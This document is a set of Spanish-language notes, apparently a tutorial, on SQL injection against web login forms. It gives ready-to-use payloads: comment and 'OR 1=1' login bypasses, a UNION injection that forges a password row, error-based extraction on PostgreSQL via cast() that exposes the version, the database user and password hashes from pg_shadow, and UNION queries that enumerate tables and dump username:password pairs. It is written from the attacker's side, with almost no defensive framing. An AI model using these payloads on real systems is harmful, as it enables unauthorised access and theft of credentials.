Ejemplos de uso de Inyección SQL para ciertos formularios

1.- Vamos al supuesto en el que la página envia una consulta SQL select * from db.tabla where parametro1 = POST PARAMETROS1 and parametro2 = POST PARAMETRO2

Para este caso especifico al generar la consulta con el post sin ningun tipo de limpieza podemos hacer inyecciones de SQL
por ejemplo Parametro1= par1 '<cerrar las comillas> -- | ## <Esto es para hacer un comentario y que ignore lo que sigue>

De esta manera sin conocer par2 nos permitiria acceder a todo lo relacionado con par1 mientras este exista en la db

Para otro caso donde no conozcamos el par1 lo que podemos hacer es agregar el operador lógico OR por ejemplo:

Parametro1= par1 ' or 1=1 -- con esto tomaria el primer valor de la tabla y nos daría acceso al sistema (este primer dato normalmente suele ser admin)


2.- Para el segundo ejemplo supongamos que uno de los datos se sanitiza

PHP
$sql = "select trim(contrasena) pwd, id, \"desc\" 
        from almacen.usuarios 
        where nombre = '" . $_POST["nombre"] . "'";

SQL
SELECT TRIM(contrasena) pwd, id, "desc"
FROM almacen.usuarios
WHERE nombre = 'juan';

Para este ejemplo en particular uno de los datos se sanitiza pero conociendo la estructura de la consulta es posible de terminar 
como enviar la inyección para obtener los datos.

Usuario= aa' union select 'asd'<pwd>, 1<ID tipo int>, 'null'<usr> --
PWD= asd

Con esto haríamos la unión de 2 consultas una que no nos devuelve nada y otra que nos devuelve los datos de inicio de sesión del usuario 
con el ID "1"

Ahora al hacer esto más adelante la aplicación comprobará las contraseñas utilizando los varlores que nosotros le proporcionamos "asd"


*NOTA IMPORTANTE no solo los parámetros GET o POST son susceptibles a inyección SQL, si el usuario introduce datos que son referidos a las consultas
sql sin los debidos controles puede ser un vector de ataque.

*NOTA2 Para los datos enteros o INT no se deben poner ' o marcará une error de sintaxis

Una vez dentro podemos Obtener información de la base de datos 

Por ejemplo si tenemos uba base de datos PostgreSQL
podemos utilizar "cast" que nos permite cambiar los tipos de datos, entonces que pasa si el servidor tiene hanilitado enseñar mensajes de
error (Si por ejemplo tuviera un parámetro GET de un dato tipo int y nosotros pusieramos ')y hacemos un cast(version()as int), 
pues al no poderse hacer el cambio obtendriamos la versión de la DB.
De la misma manera podríamos obtener La base de datos en uso, el usuario, etc
Ejemplo cast(current_database()||'-'||user as int) salida seria Base de datos - Usuario de la base de datos

Obteniendo el Username y suficientes privilegios es posible extrar la contraseña, ya que PostgresSQL almacena la información en una
tabla llamada "pg_shadow" la cual tiene las columnas usename y passwd, con select anidada es posible extrar la información de ella
cast((select passwd from pg_shadow where usename='tester')as int)
Resultado es el hash de Passwd+Username en ese orden

*NOTA3 el usuario con privilegios administrativos habitualmente en los sistemas es postgres

Enumerar tablas.
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'

Enumerar columnas.
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'

Extraer datos.
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
